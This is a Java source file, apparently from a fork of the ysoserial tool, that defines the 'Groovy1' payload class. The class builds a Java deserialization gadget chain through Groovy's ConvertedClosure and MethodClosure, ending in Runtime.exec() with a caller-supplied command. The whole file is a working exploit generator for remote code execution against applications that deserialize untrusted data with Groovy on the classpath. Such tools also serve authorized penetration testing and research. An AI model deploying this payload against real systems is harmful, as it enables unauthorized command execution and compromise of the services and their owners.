package me.gv7.woodpecker.yso.payloads;

import java.lang.reflect.InvocationHandler;
import java.util.Map;

import me.gv7.woodpecker.yso.payloads.util.Gadgets;
import me.gv7.woodpecker.yso.payloads.util.PayloadRunner;
import org.codehaus.groovy.runtime.ConvertedClosure;
import org.codehaus.groovy.runtime.MethodClosure;

import me.gv7.woodpecker.yso.payloads.annotation.Authors;
import me.gv7.woodpecker.yso.payloads.annotation.Dependencies;

/*
	Gadget chain:
		ObjectInputStream.readObject()
			PriorityQueue.readObject()
				Comparator.compare() (Proxy)
					ConvertedClosure.invoke()
						MethodClosure.call()
							...
						  		Method.invoke()
									Runtime.exec()

	Requires:
		groovy
 */

@SuppressWarnings({ "rawtypes", "unchecked" })
@Dependencies({"org.codehaus.groovy:groovy:2.3.9"})
@Authors({ Authors.FROHOFF })
public class Groovy1 extends PayloadRunner implements ObjectPayload<InvocationHandler> {

	public InvocationHandler getObject(final String command) throws Exception {
		final ConvertedClosure closure = new ConvertedClosure(new MethodClosure(command, "execute"), "entrySet");

		final Map map = Gadgets.createProxy(closure, Map.class);

		final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(map);

		return handler;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(Groovy1.class, args);
	}
}
